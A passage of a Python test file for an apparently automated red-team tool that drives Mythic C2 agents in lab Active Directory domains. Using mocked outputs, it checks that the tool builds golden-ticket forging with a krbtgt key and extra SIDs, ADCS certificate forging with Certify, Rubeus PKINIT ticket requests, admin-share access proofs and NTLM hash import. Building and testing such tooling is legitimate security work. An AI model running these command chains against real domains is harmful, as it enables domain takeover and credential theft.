                "proof_resource": r"\\braavos.essos.local\C$",
            },
        )))

    assert result["ok"] is True
    assert result["capability"] == "ensure-kerberos-context"
    assert result["action"]["name"] == "ensure-kerberos-context"
    assert result["action"]["effects"] == ["kerberos-context:essos.local@callback:14"]
    assert result["stopped_after"] == "current_context_preflight"
    assert [item["command"] for item in result["issued"]] == ["shell", "shell"]
    assert calls["issue"] == 2


def test_execute_capability_bare_domain_proof_resource_resolves_to_dc_share():
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="braavos.essos.local")
    outputs = iter([
        "krbtgt/essos.local for Administrator@essos.local",
        "Directory of \\\\braavos.essos.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9903):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-kerberos-context",
                "domain": "essos.local",
                "callback_id": "14",
            },
            {
                "callback_id": "14",
                "domain": "essos.local",
                "proof_resource": "essos.local",
            },
        )))

    assert result["ok"] is True, result
    assert result["stopped_after"] == "current_context_preflight"
    assert calls["issue"] == 2
    assert result["issued"][1]["parameters"] == "dir \\\\braavos.essos.local\\C$"
    assert "kerberos-context:essos.local@callback:14" in result["recorded_effects"]


def test_build_capability_commands_bare_domain_proof_resource_resolves_to_dc_share():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "essos.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = lambda domain: asyncio.sleep(0, result="S-1-5-21-111-222-333")
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="braavos.essos.local")

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "ensure-kerberos-context",
            "domain": "essos.local",
            "callback_id": "14",
        },
        {"proof_resource": "essos.local"},
    )))

    assert plan["ok"] is True
    assert plan["commands"][1]["parameters"] == "dir \\\\braavos.essos.local\\C$"
    assert plan["execution_plan"]["steps"][1]["parameters"]["resource"] == "\\\\braavos.essos.local\\C$"


def test_execute_capability_ensure_kerberos_context_rewrites_sysvol_proof_to_admin_share():
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    outputs = iter([
        "Cached Tickets: (1)\r\n#0> Client: samwell.tarly @ ESSOS.LOCAL\r\n"
        "Server: krbtgt/ESSOS.LOCAL @ ESSOS.LOCAL\r\n",
        "Directory of \\\\braavos.essos.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9905):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "ensure-kerberos-context",
                "domain": "essos.local",
                "callback_id": "14",
            },
            {
                "callback_id": "14",
                "domain": "essos.local",
                "proof_resource": r"\\braavos.essos.local\SYSVOL",
            },
        )))

    assert result["ok"] is True, result
    assert result["stopped_after"] == "current_context_preflight"
    assert result["issued"][1]["parameters"] == r"dir \\braavos.essos.local\C$"
    assert "kerberos-context:essos.local@callback:14" in result["recorded_effects"]


def test_resolve_domain_controller_host_uses_bloodhound_membership():
    mt = _make_tools()

    class FakeCypherTool:
        async def ainvoke(self, args):
            assert args["info_type"] == "run"
            assert "g.objectid ENDS WITH '-516'" in args["query"]
            assert "sevenkingdoms.local" in args["query"]
            return [{
                "text": json.dumps({
                    "data": {
                        "literals": [
                            {"value": "kingslanding.sevenkingdoms.local"},
                        ],
                    },
                }),
            }]

    mt._bloodhound_cypher_tool = lambda: FakeCypherTool()

    host = asyncio.run(mt._resolve_domain_controller_host("sevenkingdoms.local"))

    assert host == "kingslanding.sevenkingdoms.local"
    assert mt._domain_controller_cache["sevenkingdoms.local"] == "kingslanding.sevenkingdoms.local"


def test_build_capability_commands_overrides_untrusted_parent_sid_with_bloodhound_sid():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    async def fake_resolve_domain_sid(domain):
        return {
            "north.sevenkingdoms.local": "S-1-5-21-111-222-333",
            "sevenkingdoms.local": "S-1-5-21-444-555-666",
        }.get(domain, "")

    mt._fetch_credentials_cached = fake_fetch_credentials
    mt._resolve_domain_sid = fake_resolve_domain_sid
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
        0, result="kingslanding.sevenkingdoms.local"
    )

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "forge-golden-ticket",
            "domain": "north.sevenkingdoms.local",
            "target_domain": "sevenkingdoms.local",
        },
        {
            "domain_sid": "S-1-5-21-999-999-999",
            "parent_domain_sid": "S-1-5-21-77519052-216237895-483694134",
        },
    )))

    assert plan["ok"] is True
    rendered = plan["commands"][2]["parameters"]["assembly_arguments"]
    assert "/sid:S-1-5-21-111-222-333" in rendered
    assert "/sids:S-1-5-21-444-555-666-519" in rendered
    assert "77519052" not in rendered


def test_build_capability_commands_rejects_numeric_parent_sid_without_source():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local", "target_domain": "sevenkingdoms.local"},
        {
            "domain_sid": "S-1-5-21-111-222-333",
            "parent_domain_sid": "S-1-5-21-77519052-216237895-483694134",
        },
    )))

    assert plan["ok"] is False
    assert "missing_extra_sids_source" in plan["missing"]
    assert plan["commands"] == []
    assert mt._deterministic_ticket_command_keys == set()


def test_build_capability_commands_rejects_malformed_parent_domain_sid():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local"},
        {
            "domain_sid": "S-1-5-21-111-222-333",
            "parent_domain_sid": "S-1-5-21-77519052-5f09-44cc-ae0b-23c364c894d0",
        },
    )))

    assert plan["ok"] is False
    assert "invalid_parent_domain_sid" in plan["missing"]
    assert plan["commands"] == []
    assert mt._deterministic_ticket_command_keys == set()


def test_build_capability_commands_rejects_malformed_explicit_extra_sid():
    mt = _make_tools()

    async def fake_fetch_credentials(now):
        return [
            {
                "id": 12,
                "account": "krbtgt",
                "realm": "north.sevenkingdoms.local",
                "type": "key",
                "credential_text": "a" * 64,
            },
        ]

    mt._fetch_credentials_cached = fake_fetch_credentials

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local"},
        {
            "domain_sid": "S-1-5-21-111-222-333",
            "extra_sids": ["S-1-5-21-77519052-5f09-44cc-ae0b-23c364c894d0-519"],
        },
    )))

    assert plan["ok"] is False
    assert "invalid_extra_sids" in plan["missing"]
    assert plan["commands"] == []
    assert mt._deterministic_ticket_command_keys == set()


def test_build_capability_commands_supports_adcs_certificate_auth_pkinit():
    mt = _make_tools()

    plan = json.loads(asyncio.run(mt.build_capability_commands(
        {
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
        {
            "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
            "proof_host": "dc01.lab.local",
        },
    )))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    pkinit = plan["commands"][3]
    rendered = pkinit["parameters"]["assembly_arguments"]
    assert rendered.startswith("asktgt /user:administrator /domain:lab.local")
    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in rendered
    assert "/ptt" not in rendered
    key = mythic_tools._ticket_command_key(pkinit["command"], pkinit["parameters"])
    assert key in mt._deterministic_ticket_command_keys
    assert mt._deterministic_ticket_command_contexts[key]["capability"] == "adcs-certificate-auth"
    assert plan["commands"][-1]["expected_probe"] == "extract_adcs_certificate_auth_probe"


def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses_it(monkeypatch):
    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
    artifact_dir = state_dir / "artifacts"
    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
    engagement_ledger.save({
        "engagement_id": "test-op",
        "hops": [
            {
                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
                "effect": "adcs-ca-private-key:ca01@lab.local",
                "status": "achieved",
                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
                "evidence": {
                    "artifact_present": True,
                    "verify_verdict": "achieved",
                    "pfx_artifact_path": str(ca_artifact),
                },
            }
        ],
    }, "test-op")
    mt = _make_tools()
    mt._engagement_key = "test-op"
    calls = {}

    async def fake_register_file(filename, contents):
        calls["registered_filename"] = filename
        calls["registered_contents"] = contents
        return "file-uuid-1"

    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
        mt._last_issued_task_display_id = 9001
        calls["upload"] = {
            "command": command,
            "parameters": parameters,
            "file_uuid": file_uuid,
            "callback_display_id": callback_display_id,
            "timeout": timeout,
        }
        return "Uploaded forged PFX"

    monkeypatch.setattr(mt, "_register_file", fake_register_file)
    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)

    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
        {
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "cb13",
        },
        {"proof_host": "dc01.lab.local", "timeout": 30, "ca_pfx_password": "CA Secret!"},
    )))

    assert materialized["ok"] is True
    assert "certificate_already_forged" not in materialized["inputs"]
    assert materialized["inputs"]["ca_pfx_path"] == r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx"
    assert materialized["inputs"]["ca_pfx_password"] == "CA Secret!"
    assert materialized["inputs"]["forged_pfx_path"] == r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx"
    assert calls["registered_filename"] == ca_artifact.name
    assert calls["registered_contents"] == ca_artifact.read_bytes()
    assert calls["upload"] == {
        "command": "upload",
        "parameters": {
            "File": "file-uuid-1",
            "Path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
        },
        "file_uuid": "file-uuid-1",
        "callback_display_id": 13,
        "timeout": 30,
    }

    plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))

    assert plan["ok"] is True
    assert [command["command"] for command in plan["commands"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    forge = plan["commands"][2]
    assert forge["parameters"]["assembly_name"] == "Certify.exe"
    assert "forge --ca-cert C:\\Windows\\Temp\\sage_ca_signing_administrator_lab_local_13.pfx" in forge["parameters"]["assembly_arguments"]
    assert '--ca-pass "CA Secret!"' in forge["parameters"]["assembly_arguments"]
    pkinit = plan["commands"][3]
    assert pkinit["parameters"]["assembly_name"] == "Rubeus.exe"
    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit["parameters"]["assembly_arguments"]
    assert "/ptt" not in pkinit["parameters"]["assembly_arguments"]


def test_materialize_capability_inputs_compacts_merlin_paths_and_uses_registered_filename(monkeypatch):
    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
    artifact_dir = state_dir / "artifacts"
    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
    engagement_ledger.save({
        "engagement_id": "test-op",
        "hops": [
            {
                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
                "effect": "adcs-ca-private-key:ca01@lab.local",
                "status": "achieved",
                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
                "evidence": {
                    "artifact_present": True,
                    "verify_verdict": "achieved",
                    "pfx_artifact_path": str(ca_artifact),
                },
            }
        ],
    }, "test-op")
    mt = _make_tools()
    mt._engagement_key = "test-op"
    calls = {}

    async def fake_register_file(filename, contents):
        return "ca-file-uuid"

    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
        mt._last_issued_task_display_id = 9002
        calls["upload"] = {
            "command": command,
            "parameters": parameters,
            "file_uuid": file_uuid,
            "callback_display_id": callback_display_id,
        }
        return "Uploaded CA PFX"

    monkeypatch.setattr(mt, "_register_file", fake_register_file)
    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)

    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
        {
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
        {
            "proof_host": "dc01.lab.local",
            "ca_pfx_password": "CA Secret!",
            "account_sid": "S-1-5-21-111-222-333-500",
            "mythic_adapter": dict(mythic_capability_adapter.MERLIN_MYTHIC_ADAPTER),
        },
    )))

    assert materialized["ok"] is True
    assert materialized["inputs"]["ca_pfx_path"] == r".\c"
    assert materialized["inputs"]["forged_pfx_path"] == r".\f"
    assert calls["upload"] == {
        "command": "upload",
        "parameters": {
            "filename": ca_artifact.name,
            "path": materialized["inputs"]["ca_pfx_path"],
        },
        "file_uuid": "ca-file-uuid",
        "callback_display_id": 13,
    }

    plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))

    assert plan["ok"] is True
    forge = next(command for command in plan["commands"] if command["operation"] == "adcs-certificate-forge")
    assert forge["command"] == "execute-assembly"
    assert forge["parameters"]["filename"] == "Certify.exe"
    assert materialized["inputs"]["ca_pfx_path"] in forge["parameters"]["arguments"]
    assert materialized["inputs"]["forged_pfx_path"] in forge["parameters"]["arguments"]
    assert len(forge["parameters"]["arguments"].encode("utf-8")) <= 255


def test_materialize_capability_inputs_fails_closed_when_adcs_upload_never_issues_task(monkeypatch):
    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
    artifact_dir = state_dir / "artifacts"
    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
    engagement_ledger.save({
        "engagement_id": "test-op",
        "hops": [
            {
                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
                "effect": "adcs-ca-private-key:ca01@lab.local",
                "status": "achieved",
                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
                "evidence": {
                    "artifact_present": True,
                    "verify_verdict": "achieved",
                    "pfx_artifact_path": str(ca_artifact),
                },
            }
        ],
    }, "test-op")
    mt = _make_tools()
    mt._engagement_key = "test-op"
    mt._last_issued_task_display_id = 8999

    async def fake_register_file(filename, contents):
        return "file-uuid-1"

    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
        return (
            "Parameter 'filename' for command 'upload' is a ChooseOne whose value must be the "
            "selectable DISPLAY STRING, NOT a bare UUID."
        )

    monkeypatch.setattr(mt, "_register_file", fake_register_file)
    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)

    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
        {
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
        {"proof_host": "dc01.lab.local", "ca_pfx_password": "CA Secret!"},
    )))

    assert materialized["ok"] is False
    assert materialized["missing"] == ["ca_pfx_upload"]
    assert "did not issue a Mythic task" in materialized["reason"]
    assert "staged" not in materialized
    assert mt._last_issued_task_display_id is None


def test_resolve_domain_sid_falls_back_to_account_object_sid():
    mt = _make_tools()

    class FakeCypher:
        def __init__(self):
            self.queries = []

        async def ainvoke(self, args):
            query = args["query"]
            self.queries.append(query)
            if "MATCH (d:Domain)" in query:
                return json.dumps({"data": {"literals": []}})
            return json.dumps({"data": {"literals": [
                {"value": "S-1-5-21-111-222-333-500"}
            ]}})

    fake = FakeCypher()
    mt._bloodhound_cypher_tool = lambda: fake

    sid = asyncio.run(mt._resolve_domain_sid("ESSOS.LOCAL"))

    assert sid == "S-1-5-21-111-222-333"
    assert any("MATCH (d:Domain)" in query for query in fake.queries)
    assert any("MATCH (n)" in query for query in fake.queries)


def test_materialize_capability_inputs_embeds_resolved_administrator_sid(monkeypatch):
    state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
    artifact_dir = state_dir / "artifacts"
    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx")
    engagement_ledger.save({
        "engagement_id": "test-op",
        "hops": [
            {
                "id": "capability:adcs-ca-private-key-export:target=ca01;target_domain=lab.local;callback=13",
                "effect": "adcs-ca-private-key:ca01@lab.local",
                "status": "achieved",
                "satisfied_effects": ["adcs-ca-private-key:ca01@lab.local"],
                "evidence": {
                    "artifact_present": True,
                    "verify_verdict": "achieved",
                    "pfx_artifact_path": str(ca_artifact),
                },
            }
        ],
    }, "test-op")
    mt = _make_tools()
    mt._engagement_key = "test-op"
    mt._resolve_domain_sid = lambda domain: asyncio.sleep(0, result="S-1-5-21-111-222-333")
    calls = {}

    async def fake_register_file(filename, contents):
        calls["registered_contents"] = contents
        return "file-uuid-1"

    async def fake_upload(command, parameters, file_uuid, callback_display_id, token_id=None, timeout=None):
        mt._last_issued_task_display_id = 9001
        return "Uploaded forged PFX"

    monkeypatch.setattr(mt, "_register_file", fake_register_file)
    monkeypatch.setattr(mt, "upload_file_by_file_uuid", fake_upload)

    materialized = json.loads(asyncio.run(mt.materialize_capability_inputs(
        {
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
        {"proof_host": "dc01.lab.local"},
    )))

    assert materialized["ok"] is True
    assert materialized["inputs"]["account_sid"] == "S-1-5-21-111-222-333-500"
    assert calls["registered_contents"] == ca_artifact.read_bytes()
    plan = json.loads(asyncio.run(mt.build_capability_commands(materialized["action"], materialized["inputs"])))
    assert plan["ok"] is True
    forge_step = plan["execution_plan"]["steps"][2]
    assert forge_step["operation"] == "adcs-certificate-forge"
    assert forge_step["parameters"]["account_sid"] == "S-1-5-21-111-222-333-500"


def test_execute_capability_adcs_certificate_auth_requires_verified_ca_key_before_tasking(monkeypatch):
    mt = _make_tools()
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fail_materialize(action, inputs=None):
        raise AssertionError("materializer should not run without a verified CA-key prerequisite")

    monkeypatch.setattr(mt, "materialize_capability_inputs", fail_materialize)
    calls = {"issue": 0}

    with _split_issue("should not issue", calls, display_id=9090):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "target": "ca01",
                "callback_id": "13",
            },
            {"proof_host": "ca01.lab.local", "timeout": 5},
        )))

    assert result["ok"] is False
    assert result["verdict"] == "failed"
    assert result["suggested_capability"] == "adcs-ca-private-key-export"
    assert result["missing"] == [
        "adcs-ca-private-key:ca01@lab.local",
        "adcs-enrolled-certificate:administrator@lab.local",
    ]
    assert calls["issue"] == 0


def test_execute_capability_adcs_certificate_auth_materializes_and_records(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    materialize_calls = {"count": 0}

    async def fake_materialize(action, inputs=None):
        materialize_calls["count"] += 1
        return json.dumps({
            "ok": True,
            "capability": "adcs-certificate-auth",
            "action": {
                "name": "adcs-certificate-auth",
                "target": "domain=lab.local;account=administrator;callback=13",
                "preconditions": ["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
                "intent": {
                    "capability": "adcs-certificate-auth",
                    "domain": "lab.local",
                    "account": "administrator",
                    "callback_id": "13",
                    "ca_host": "ca01",
                },
                "verifier": {},
                "reason": "",
                "source_facts": [],
            },
            "inputs": {
                "domain": "lab.local",
                "target_domain": "lab.local",
                "account": "administrator",
                "callback_id": "13",
                "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx",
                "ca_pfx_password": "SagePfx!administrator_lab_local_13",
                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                "forged_pfx_password": "SageCert!administrator_lab_local_13",
                "proof_host": "dc01.lab.local",
                "proof_resource": r"\\dc01.lab.local\C$",
                "proof_marker": "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
            },
            "staged": {
                "mythic_file_uuid": "file-uuid-1",
                "remote_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                "callback_id": "13",
                "upload_task_id": 9001,
            },
        }, sort_keys=True)

    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
    ticket = base64.b64encode(b"A" * 80).decode()
    outputs = iter([
        "No tickets in current context.",
        "Access is denied.",
        "Certify\nSaved forged certificate to 'C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx'.\n",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
        "Added Ticket to Ticket Store",
        "krbtgt/lab.local for administrator@lab.local",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13\r\n Directory of \\\\dc01.lab.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9191):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "ca_host": "ca01",
                "callback_id": "13",
            },
            {"proof_host": "dc01.lab.local", "timeout": 5},
        )))

    assert result["ok"] is True
    assert result["verdict"] == "achieved"
    assert materialize_calls["count"] == 1
    assert calls["issue"] == 8
    assert [item["command"] for item in result["issued"]] == [
        "shell",
        "shell",
        "execute_assembly",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    forge_args = result["issued"][2]["parameters"]["assembly_arguments"]
    assert "forge --ca-cert C:\\Windows\\Temp\\sage_ca_signing_administrator_lab_local_13.pfx" in forge_args
    pkinit_args = result["issued"][3]["parameters"]["assembly_arguments"]
    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_13.pfx" in pkinit_args
    assert "/ptt" not in pkinit_args
    assert ticket not in json.dumps(result["issued"])
    assert "<kerberos_ticket_base64>" in json.dumps(result["issued"])
    assert "_output" not in json.dumps(result["issued"])
    assert "da:lab.local" in result["achieved_effects"]
    assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]


@pytest.mark.parametrize(
    "pkinit_failure",
    [
        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP\r\n",
        "[*] Action: Ask TGT\r\n[X] KRB-ERROR (62) : KDC_ERR_CLIENT_NOT_TRUSTED\r\n",
    ],
    ids=["padata-not-supported", "client-not-trusted"],
)
def test_execute_capability_adcs_certificate_auth_falls_back_to_schannel_for_compatible_pkinit_errors(
    monkeypatch,
    pkinit_failure,
):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="dc01.lab.local")

    async def fake_materialize(action, inputs=None):
        return json.dumps({
            "ok": True,
            "capability": "adcs-certificate-auth",
            "action": {
                "name": "adcs-certificate-auth",
                "target": "domain=lab.local;account=administrator;ca_host=ca01;callback=13",
                "preconditions": ["adcs-ca-private-key:ca01@lab.local", "live-callback:13"],
                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
                "intent": {
                    "capability": "adcs-certificate-auth",
                    "domain": "lab.local",
                    "account": "administrator",
                    "callback_id": "13",
                    "ca_host": "ca01",
                },
                "verifier": {},
                "reason": "",
                "source_facts": [],
            },
            "inputs": {
                "domain": "lab.local",
                "target_domain": "lab.local",
                "account": "administrator",
                "callback_id": "13",
                "certificate_already_forged": True,
                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                "forged_pfx_password": "SageCert!administrator_lab_local_13",
                "proof_host": "dc01.lab.local",
                "proof_resource": r"\\dc01.lab.local\C$",
                "proof_marker": "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
            },
        }, sort_keys=True)

    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
    schannel_output = "\n".join([
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13",
        "CERT_AUTH_METHOD=schannel-ldap",
        "CERT_AUTH_DOMAIN=lab.local",
        "CERT_AUTH_ACCOUNT=administrator",
        "CERT_AUTH_LDAP_BIND=True",
        "CERT_AUTH_USER_DN=CN=Administrator,CN=Users,DC=lab,DC=local",
        "CERT_AUTH_MEMBER_OF=CN=Domain Admins,CN=Users,DC=lab,DC=local",
        "CERT_AUTH_STATUS=OK",
    ])
    outputs = iter([
        "No tickets in current context.",
        "Access is denied.",
        pkinit_failure,
        schannel_output,
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9494):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "ca_host": "ca01",
                "callback_id": "13",
            },
            {"proof_host": "dc01.lab.local", "timeout": 5},
        )))

    assert result["ok"] is True, result
    assert result["fallback"] == "schannel-ldap"
    assert result["stopped_after"] == "schannel_ldap_fallback_verified_proof"
    assert calls["issue"] == 4
    assert result["issued"][-1]["command"] == "powerpick"
    assert result["issued"][-1]["fallback"] == "schannel-ldap"
    assert "$server='dc01.lab.local'" in result["issued"][-1]["parameters"]
    assert "da:lab.local" in result["achieved_effects"]
    assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]


def test_adcs_certificate_auth_does_not_fallback_for_unrelated_pkinit_error():
    mt = _make_tools()

    assert mt._capability_executor_pkinit_fallback_eligible(
        "[X] KRB-ERROR (24) : KDC_ERR_PREAUTH_FAILED"
    ) is False


def test_adcs_certificate_auth_has_no_off_agent_schannel_fallback_surface():
    mt = _make_tools()
    assert not hasattr(mt, "_capability_executor_try_host_schannel_fallback")
    assert not hasattr(mt, "_capability_executor_host_schannel_probe_sync")
    assert not hasattr(mt, "_capability_executor_try_remote_schannel_fallback")


def test_import_capability_credential_material_imports_adcs_certificate_auth_ntlm(monkeypatch):
    mt = _make_tools()
    captured = {}

    async def fake_import(material, source_task_id=""):
        captured["material"] = material
        captured["source_task_id"] = source_task_id
        return [{"status": "created", "account": material[0]["account"], "realm": material[0]["realm"]}]

    monkeypatch.setattr(mt, "_import_credential_material", fake_import)
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=[],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "callback_id": "13",
        },
    )

    refs = asyncio.run(mt._import_capability_credential_material(
        action,
        {"domain": "lab.local", "account": "administrator"},
        "Hash NTLM: 2b576acbe6bcfda7294d6bd18041b8fe",
        9191,
    ))

    assert refs == [{"status": "created", "account": "administrator", "realm": "lab.local"}]
    assert captured["source_task_id"] == 9191
    assert captured["material"][0]["account"] == "administrator"
    assert captured["material"][0]["realm"] == "lab.local"
    assert captured["material"][0]["secret_type"] == "ntlm"
    assert captured["material"][0]["credential_type"] == "hash"


def test_execute_capability_adcs_certificate_auth_defaults_proof_to_ca_host(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="")
    materialize_calls = {"count": 0}

    async def fake_materialize(action, inputs=None):
        materialize_calls["count"] += 1
        assert inputs["proof_resource"] == r"\\ca01.lab.local\C$"
        return json.dumps({
            "ok": True,
            "capability": "adcs-certificate-auth",
            "action": {
                "name": "adcs-certificate-auth",
